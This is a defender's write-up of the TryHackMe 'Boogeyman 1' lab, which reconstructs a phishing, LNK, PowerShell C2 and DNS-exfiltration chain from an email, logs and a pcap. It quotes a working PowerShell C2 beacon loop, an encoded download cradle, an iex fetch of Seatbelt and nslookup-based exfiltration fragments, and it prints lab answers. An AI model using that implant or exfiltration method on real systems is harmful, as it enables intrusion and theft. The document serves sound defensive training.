---
title: Boogeyman 1
module: SOC Level 1 Capstone Challenges
path: SOC Level 1
platform: TryHackMe
tags: [phishing-analysis, email-headers, eml, lnk-analysis, lnkparse, base64, powershell-logs, jq, log-analysis, wireshark, tshark, pcap, c2, exfiltration, keepass, capstone]
status: complete
date: 2026-07-31
date_completed: 2026-08-03
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/boogeyman.png width="1500">
</p>

---

## TASK 1 - [Introduction] New threat in town

- Capstone challenge in the SOC Level 1 path, built around a threat group called Boogeyman
- Goal is to trace the full TTP chain from initial access through to the actor's objective
- Attack starts with a phishing email and ends with data exfiltration off a finance workstation
- Three artefacts provided in `/home/ubuntu/Desktop/artefacts`: a phishing email (`dump.eml`), PowerShell logs from the victim workstation (`powershell.json`), and a packet capture (`capture.pcapng`)
- PowerShell logs are JSON, converted from the original evtx via evtx2json
- Toolkit on the VM: Thunderbird, LNKParse3, Wireshark, tshark, jq, plus grep / sed / awk / base64
- Pulls phishing analysis, Windows event logs, and traffic analysis into one investigation

<p align="center">
<img src=screenshots/boogeyman1.png width="700">
</p>

---

## TASK 2 - [Email Analysis] Look at that headers!

### The Boogeyman is here!

- Julianne works in finance at Quick Logistics LLC
- She received a follow-up email about an unpaid invoice, appearing to come from a business partner, B Packaging Inc
- The attachment was malicious and compromised her workstation
- Other finance employees also submitted phishing reports, which points to the finance team being targeted deliberately
- The security team flagged the attachment execution and matched the initial TTP to the Boogeyman group, known for hitting the logistics sector
- Task here is to analyze the email and assess the impact of the compromise

---

### 1. What is the email address used to send the phishing email?

Open `dump.eml` in Thunderbird:

```
thunderbird ~/Desktop/artefacts/dump.eml
```

- Set the message body to display as plain text, which exposes full links instead of display text
- Then inspect the source to read the header metadata

<p align="center">
<img src=screenshots/boogeyman-sender.png width="700">
</p>

**Answer: agriffin@bpakcaging.xyz**

---

### 2. What is the email address of the victim?

<p align="center">
<img src=screenshots/boogeyman-receiver.png width="700">
</p>

**Answer: julianne.westcott@hotmail.com**

---

### 3. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

A DKIM signature that does not match the visible sender domain is a major red flag when triaging a suspected phish.

- The message displays as coming from `agriffin@bpakcaging.xyz`
- The DKIM signature and the List-Unsubscribe header both point to elasticemail instead

<p align="center">
<img src=screenshots/boogeyman-elasticemail.png width="700">
</p>

**Answer: elasticemail**

---

### 4. What is the name of the file inside the encrypted attachment?

Reading further through the source, the attachment is present but base64 encoded:

```
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64
UEsDBBUEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6......
```

Decode it, appending an extra newline in case bash does not flush the final line:

```
echo "UEsDBBUEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6......" | base64 -d; echo ""
```

<p align="center">
<img src=screenshots/boogeyman-invoice.png width="700">
</p>

**Answer: Invoice_20230103.lnk**

---

### 5. What is the password of the encrypted attachment?

- Unzip the attachment. Doing this on Linux is safe, since the payload is a Windows LNK.
- The archive prompts for a password, and the password was supplied in the body of the phishing email itself.

<p align="center">
<img src=screenshots/boogeyman-invoice2023.png width="700">
</p>

**Answer: Invoice2023!**

---

### 6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Locate the tool, then run it against the extracted LNK:

```
which lnkparse
/home/ubuntu/.local/bin/lnkparse

~/.local/bin/lnkparse Invoice_20230103.lnk
```

```
 DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico
```

Worth noting the tradecraft in that one line:

- `-nop` skips the user profile, so no logging or customization loads
- `-windowstyle hidden` means Julianne never sees a console
- `-enc` takes a base64 UTF-16LE blob, which defeats naive string matching on the command line

<p align="center">
<img src=screenshots/boogeyman-encoded.png width="700">
</p>

**Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==**

---

## TASK 3 - [Endpoint Security] Are you sure that's an invoice?

### Investigation Guide

Summarizing where we are:

- A PowerShell command was executed via the LNK
- Decoding that payload gives the starting point for endpoint activity

Next steps:

- Analyze the PowerShell logs
- Data is JSON, so parse it on the CLI with `jq`
- Plenty of entries carry no value, ignore them

### jq cheatsheet

```
jq -r '.[] | .ScriptBlockText' powershell.json | less -S
```

- `-S` stops long lines from wrapping into soup, arrow keys scroll sideways

```
jq -r '.[] | "=== \(.ScriptBlockText)"' powershell.json
```

- Adds a visual separator at the top of every block, which makes the boundaries between script blocks obvious

```
jq 'keys' powershell.json
jq '.[0] | keys' powershell.json
```

- Shows what other fields exist before you commit to grepping the wrong one. Timestamps and host fields are usually in there, and usually needed two questions later.

```
jq -r '.[] | select(.ScriptBlockText | test("http"))' powershell.json
```

- Filters inside jq instead of piping to grep, so the surrounding fields survive

---

### 1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order

The room's suggested commands produced output that was nearly unreadable. Formatting with `jq .` first fixes that:

```
jq . powershell.json | grep -i "http"
```

This surfaces the C2 implant:

```
"ScriptBlockText": "$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n",
```

**How to recognize C2 by structure rather than by IOC**

A two way conversation that repeats forever is the strongest tell:

- A `while ($true)` loop with a `sleep` at the end of the body
- A GET that fetches a task, and a POST that carries the output back
- `iex` applied to whatever the server returned
- Endpoint names that are opaque IDs rather than filenames

**Reading the three endpoint IDs**

`$i='8cce49b0-b86459bb-27fe2489'` is not one identifier, it is three, glued with hyphens. Each maps to a job:

- `/8cce49b0` is hit once before the loop, the check-in beacon
- `/b86459bb` is hit with GET inside the loop, the task channel
- `/27fe2489` is hit with POST, the output channel

That split matters later. Anything the attacker typed comes down `/b86459bb`. Anything they saw went up `/27fe2489`.

<p align="center">
<img src=screenshots/boogeyman-domains.png width="700">
</p>

**Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz**

---

### 2. What is the name of the enumeration tool downloaded by the attacker?

The same `http` filter shows a tool being pulled from GitHub:

```
ubuntu@tryhackme:~/Desktop/artefacts$ jq . powershell.json | grep -i "http"
  "ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd",
```

**Answer: Seatbelt**

---

### 3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes

The path in the log is relative, so it is missing the user and the drive:

```
jq . powershell.json | grep -iE "sq3" -C 3
```

```
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd",
  "ScriptBlockId": "9e18c093-4a63-44a1-832a-9d252b09568d",
  "Path": null
```

Pivot on `Users` to recover the absolute path:

```
jq . powershell.json | grep -iE "Users" -C 2
```

```
  "ScriptBlockText": "cd Users;pwd",
--
  "ScriptBlockText": "ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd",
--
  "ScriptBlockText": "$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd",
```

<p align="center">
<img src=screenshots/boogeyman-sq3.png width="700">
</p>

<p align="center">
<img src=screenshots/boogeyman-sq32.png width="700">
</p>

**Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite**

---

### 4. What is the software that uses the file in Q3?

The package name in the path gives it away directly: `Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe`.

<p align="center">
<img src=screenshots/boogeyman-sticky.png width="700">
</p>

**Answer: Microsoft Sticky Notes**

---

### 5. What is the name of the exfiltrated file?

Filtering with context on `Users` surfaces the staging command. The `$destination` variable and the outbound IP `167.71.211.113` are the key evidence:

```
jq . powershell.json | grep -iE "Users" -C 4
```

```
"ScriptBlockText": "$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd",
"ScriptBlockId": "35d938ea-f850-4089-a382-4255a76df1e9",
```

<p align="center">
<img src=screenshots/boogeyman-protective.png width="700">
</p>

**Answer: protected_data.kdbx**

---

### 6. What type of file uses the .kdbx file extension?

OSINT lookup on the extension.

<p align="center">
<img src=screenshots/boogeyman-keepass.png width="700">
</p>

**Answer: keepass**

---

### 7. What is the encoding used during the exfiltration attempt of the sensitive file?

**Mental model: variable chain following**

PowerShell ScriptBlock logging records one chunk of script per event, so the exfil routine is split across several separate entries. Each entry declares variables that a later entry consumes. If a variable is declared and never used, the script is not finished, keep pulling the thread.

Applying that here:

- Entry 1 declares `$file`, `$destination`, `$bytes`
- `$bytes` is dangling, so pivot on it

```
jq . powershell.json | grep -iE "bytes" -C 10
```

```
"ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd",
```

- `ToString X2` formats each byte as two uppercase hex characters
- `-join ''` glues them into one continuous string

**Answer: hex**

---

### 8. What is the tool used for exfiltration?

After Q7, two variables are still dangling: `$hex` and `$destination`. Something must consume both. Pivot on the custom variable name, since it is a word the attacker invented and will only appear in their code:

```
jq . powershell.json | grep -iE "destination" -C 5
```

The entry that returns slices `$hex` into chunks, builds a subdomain, and calls `nslookup` against `$destination`.

**Why grep for variable names instead of command names**

- Command names are what an attacker might hide or rename
- Variable names are what they had to invent, and inventions are unique and greppable
- Searching for the usual exfil verbs (`Invoke-WebRequest`, `curl`, FTP) returns nothing here, which is itself the tell that the data is not leaving over HTTP

`nslookup` is a signed, built-in Windows binary that looks like routine troubleshooting, which is exactly why it was chosen.

<p align="center">
<img src=screenshots/boogeyman-destination.png width="700">
</p>

**Answer: nslookup**

---

## TASK 4 - [Network Traffic Analysis] They got us. Call the bank immediately!

### Investigation Guide

- Utilize the domains and ports discovered from the previous task
- All commands executed by the attacker and all command outputs were logged and stored in the packet capture
- Follow the streams of the notable commands discovered from the PowerShell logs
- The contents of the exfiltrated data can be recovered by understanding how it was encoded and extracted

**Two channels, two filters.** Worth writing down before touching Wireshark, because everything in this task depends on keeping them apart.

- C2 channel: `http && tcp.port == 8080`
- Exfil channel: `dns.flags.response == 0`

Filters are layers of the same packet, not competing choices. HTTP packets are TCP packets. Filter at the highest layer that still shows what you need, which here is HTTP.

---

### 1. What software is used by the attacker to host its presumed file/payload server?

The exfil destination `167.71.211.113` was recovered in Task 3.

Wireshark filter:

```
http.response and ip.src == 167.71.211.113
```

The Server header in the HTTP response identifies the hosting software.

<p align="center">
<img src=screenshots/boogeyman-python.png width="700">
</p>

**Answer: Python**

---

### 2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Already answered back in Task 3 Q1, in the implant itself:

```
$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST ...
```

This is why documenting every step pays off. Some answers are already sitting in your own notes.

**Answer: POST**

---

### 3. What is the protocol used during the exfiltration activity?

Two clues carry this: `$destination = "167.71.211.113"` and the use of `nslookup`.

- `nslookup` is the tool, DNS is the protocol
- DNS is a viable exfil channel because the data can be hidden in the subdomain of the query itself
- The attacker's server never needs to answer. The data is in the question, not the response.

To spot DNS exfiltration in Wireshark:

```
dns.flags.response == 0
```

- Filters to queries only, excluding responses
- Add **Queries > Name** as a column (right click the field, Apply as Column) to read every subdomain down the screen without clicking each packet

**Answer: DNS**

---

### 4. What is the password of the exfiltrated file?

**What we already know**

- The attacker ran `sq3.exe` against `plum.sqlite`, the Microsoft Sticky Notes database
- The target file is a KeePass database, `protected_data.kdbx`
- Nothing in the PowerShell logs cracks anything, so the password was not brute forced, it was found lying around

**The pivot**

The command itself travelled over the C2, so search the capture for it:

```
http contains "sqlite"
```

- Only two results come back
- Follow the one whose line-based text data contains the full command:

```
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

- That is packet 44459, `tcp.stream eq 749`

**The trick that makes this easy**

The C2 is request and response in strict order. The stream holding the command is immediately followed by the stream holding its output.

- Follow TCP Stream on packet 44459 to land on stream 749
- In the Follow Stream window, use the stream number spinner at the bottom and press Up to step to stream 750
- No need to clear the filter or hunt through the packet list

**Decoding the output**

Stream 750 carries the POST body, which the implant built as:

```
-Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
```

- `GetBytes` turns the text into a byte array, `-join ' '` glues those bytes with spaces
- So the body is space separated decimal, not readable text, and searching it for keywords will find nothing
- Decode it in CyberChef with **From Decimal**, delimiter **Space**

The decoded Sticky Notes rows contain the password written as a note to self.

<p align="center">
<img src=screenshots/boogeyman-password.png width="700">
</p>

**Answer: %p9^3!lL^Mz47E2GaT^y**

---

### 5. What is the credit card number stored inside the exfiltrated file?

**Where the file actually is**

The `.kdbx` never traveled over HTTP, so File > Export Objects will not produce it. It left over DNS, one hex chunk per query.

However, `nslookup` printed its output to the console on the victim host, and the implant shipped that console output back over the C2. So the entire file, in hex, in order, sits inside a single POST body.

```
http.request.uri contains "27fe2489"
```

- Sort by Length. The exfil POST is by far the largest, Content-Length 78618.
- Follow the stream and every line reads:

```
*** No address (A) records available for 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
```

<p align="center">
<img src=screenshots/boogeyman-file.png width="700">
</p>

**Reading that output**

- Every lookup fails, because the attacker's server never returns an A record. It does not need to.
- The 50 hex characters before `.bpakcaging.xyz` are 25 bytes of the KeePass database
- The final chunk is short, `76F864F2A8A4.bpakcaging.xyz`. A short last chunk always means the data ran out, so that is the end of the file.
- `Server: UnKnown / Address: 167.71.211.113` confirms nslookup was pointed at the attacker's box as its resolver
- `Path C:\Users\j.westcott\Documents` at the bottom is the `;pwd` the operator appends to every command, a fingerprint of their tooling

**Rebuilding the file**

- Strip `.bpakcaging.xyz` from each line, keeping only the hex
- Concatenate every chunk in order into one continuous hex string
- Convert hex back to binary and save as `.kdbx`
- Verify before opening, `file` should report a Keepass database rather than generic data

**Opening it**

- Open the rebuilt database in KeePassXC and unlock it with the password from Q4
- Check the Notes and Advanced tabs on each entry, not only the Password field. The card number is stored there, not in a field labelled "credit card".

**Answer: 4024007128269551**

---

## TASK 5 - [Conclusion]

- Full chain reconstructed: phishing email with a password protected archive, an LNK payload dropping an encoded PowerShell command, then hands on keyboard activity over C2
- Endpoint side showed the actor pulling down tooling, enumerating the host, and reaching into a password vault file
- Network side confirmed the C2 pattern and let the exfiltrated data be recovered straight out of the capture
- Good demonstration of why one artefact alone is never enough. The email gave initial access, the PowerShell logs gave intent, the pcap gave proof.

### Techniques worth keeping

- **Variable chain following.** Fragmented script logs split one script across many events. Grep for the attacker's custom variable names, not command names. Command names get hidden, invented variable names do not.
- **Two channel discipline.** Interactive commands and bulk data exfil often ride different protocols. Identify both before filtering, and keep them separate.
- **Sequence pivoting.** In a request and response C2, the stream holding a command is immediately followed by the stream holding its output. Find the command, step forward one stream.
- **Decode before searching.** If an implant encodes its POST bodies, keyword searching the raw capture returns nothing. Establish the encoding from the implant source first.
- **Structure over IOCs.** A `while ($true)` loop with a sleep, GET for tasks, POST for output, and opaque endpoint IDs is C2 regardless of what domain it points at.

### Real world footnote

Hand carving a pcap like this is deliberate training friction. In production, Zeek turns a capture into structured `http.log` and `dns.log` automatically, and Arkime provides a searchable web interface over full packet capture. Security Onion bundles both. The reasoning above transfers to those tools directly, the manual extraction steps do not need to.
